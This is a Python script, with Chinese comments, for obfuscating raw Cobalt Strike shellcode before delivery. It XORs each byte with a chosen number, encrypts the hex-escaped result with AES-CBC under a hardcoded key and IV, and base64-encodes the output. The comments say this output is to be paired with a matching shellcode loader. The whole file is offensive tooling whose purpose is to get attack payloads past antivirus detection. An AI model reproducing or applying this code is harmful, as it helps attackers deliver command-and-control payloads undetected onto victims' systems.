import base64
from argparse import ArgumentParser, FileType
from binascii import b2a_hex

from Crypto.Cipher import AES


def process_confused(src, num, out):
    shellcode_size = 0
    shellcode_confused = ''

    # 接下来读一个字节，异或一个字节
    try:
        while True:
            bitCode = src.read(1)
            if not bitCode:
                break
            ordCode = ord(bitCode) ^ num  # ord()返回读值是chr()对应十进制整数
            hexCode = hex(ordCode)
            hexCode = hexCode.replace('0x', '')
            if len(hexCode) == 1:
                hexCode = '0' + hexCode
            hexCode = r'\x' + hexCode  # \x UTF-8 编码
            shellcode_confused += hexCode
            shellcode_size += 1
        src.close()
        shellcode_encrypt = process_ecrypt(shellcode_confused)  # AES加密
        Base64_AES_shellcode = base64.encodebytes(shellcode_encrypt)  # 将返回的字节型数据转进行base64编码
        out.write(Base64_AES_shellcode.decode('utf-8'))  # write() argument must be str, not bytes
        out.close()
    except Exception as e:
        print(e)


def add_to_16(code):
    if len(code.encode('utf-8')) % 16:
        add = 16 - (len(code.encode('utf-8')) % 16)
    else:
        add = 0
    text = code + ('\0' * add)
    return text.encode('utf-8')


def process_ecrypt(code_confused):
    key = '9999999999999999'.encode('utf-8')  # key值随便改，记得在shellcodeLoader中对应
    mode = AES.MODE_CBC
    iv = b'qqqqqqqqqqqqqqqq'  # iv也是
    text = add_to_16(code_confused)
    aes = AES.new(key, mode, iv)
    cipher_text = aes.encrypt(text)
    # 因为AES加密后的字符串不一定是ascii字符集的，输出保存可能存在问题，所以这里转为16进制字符串
    return b2a_hex(cipher_text)


def main():
    parser = ArgumentParser(description="混淆CS生成的Raw Shellcode")
    # 输入.bin文件，输出混淆后的shellcode
    # python main.py -s raw.bin -o output_shell
    parser.add_argument('-s', '--src', help="raw shellcode,.bin file", type=FileType('rb'), required=True)
    parser.add_argument('-o', '--output', help='out put confused shellcode', type=FileType('w+'), required=True)
    parser.add_argument('-n', '--num', help='number of shellcode be confused', type=int, default=50)
    args = parser.parse_args()
    process_confused(args.src, args.num, args.output)
    print("[+]Shellcode 混淆完成, 请查看文件：{}".format(args.output.name))


if __name__ == '__main__':
    main()
